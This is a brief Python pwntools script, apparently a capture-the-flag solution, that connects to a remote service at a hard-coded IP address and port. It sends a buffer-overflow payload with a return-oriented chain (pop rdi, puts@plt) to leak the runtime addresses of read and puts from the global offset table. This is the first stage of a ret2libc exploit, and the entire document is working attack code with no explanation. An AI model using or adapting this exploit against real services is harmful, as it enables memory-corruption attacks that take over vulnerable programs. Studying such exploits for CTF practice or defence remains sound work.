from pwn import *

begin = 0x40068e
read_got = 0x601028
puts_got = 0x601018
puts_plt = 0x400500
pop_rdi = 0x400763
r= remote('111.198.29.45', 32678)

def leak(address):
    payload = 'A' * 0x40
    payload += 'B' * 8
    payload += p64(pop_rdi)
    payload += p64(address)
    payload += p64(puts_plt)
    payload += p64(begin)
    payload += 'C' * (200 - len(payload))
    r.send(payload)
    try:
        r.readuntil('bye~\n')
        leak = r.recvuntil('\n')
        return leak[:-1].ljust(8, '\0')
    except:
        return None

print "read address: " + hex(u64(leak(read_got)))
print "puts address: " + hex(u64(leak(puts_got)))
print "123"
